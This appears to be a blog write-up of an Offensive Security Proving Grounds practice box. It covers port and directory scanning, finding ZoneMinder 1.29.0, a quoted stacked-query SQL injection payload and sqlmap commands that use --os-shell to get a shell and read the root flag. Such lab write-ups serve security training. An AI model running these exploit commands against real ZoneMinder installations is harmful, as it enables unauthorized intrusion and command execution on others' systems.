---
layout: post
author: H4
---

This is an Offensive Security proving grounds practice box.

# enumeration

Starting with a `nmap` scan to identify the attack surface of the target.

## port scan

```bash
$ nmap -Pn -p- 192.168.133.52
```

The scan shows the following open ports:
- 80 (`http`)
- 8080 (`http`)
- 3305 (`http`)
- 21 (`ftp`)
- 22 (`ssh`)


## gobuster
```bash
$ gobuster dir -u http://192.168.85.52 -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt -t 5 -b 404,403
```

> The `gobuster` scan detects the directory `/zm`.
{: .prompt-info }

---

# exploitation
Inside folder `/zm` on port `80` hides the software `ZoneMinder 1.29.0`.  
Looking for an exploit.
```bash
$ searchsploit zoneminder
---------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                                                                |  Path
---------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
ZoneMinder 1.24.3 - Remote File Inclusion                                                                                                     | php/webapps/17593.txt
Zoneminder 1.29/1.30 - Cross-Site Scripting / SQL Injection / Session Fixation / Cross-Site Request Forgery                                   | php/webapps/41239.txt
ZoneMinder 1.32.3 - Cross-Site Scripting                                                                                                      | php/webapps/47060.txt
ZoneMinder Video Server - packageControl Command Execution (Metasploit)                                                                       | unix/remote/24310.rb
---------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results
```

> `Zoneminder 1.29/1.30 - Cross-Site Scripting / SQL Injection / Session Fixation / Cross-Site Request Forgery` seems to be useful as it describes a `SQL` vulnerability.
{: .prompt-info }

```
...
2)SQL Injection
Example Url:http://192.168.241.131/zm/index.php
Parameter: limit (POST)
    Type: stacked queries
    Title: MySQL > 5.0.11 stacked queries (SELECT - comment)
    Payload: view=request&request=log&task=query&limit=100;(SELECT *
FROM (SELECT(SLEEP(5)))OQkj)#&minTime=1466674406.084434
Easy exploitable using sqlmap.
...
```

We get the information that the parameter `limit` is vulnerable when performing a `GET` request to `index.php`.  
Exploiting the `SQLi` with `sqlmap`.

```bash
$ sqlmap http://192.168.133.52/zm/index.php --data="view=request&request=log&task=query&limit=100&minTime=5" --technique=s -p limit
```

--- 

# post exploitation

> As we have a stacked based `SQLi` here on `MySQL` we can use the `--os-shell` feature of `sqlmap` to get a shell on the target.
{: .prompt-info }

```bash
$ sqlmap http://192.168.133.52/zm/index.php --data="view=request&request=log&task=query&limit=100&minTime=5" --technique=s -p limit --os-shell
```

Get the flag.
```bash
$ cat /root/proof.txt
```

Pwned! <@:-)
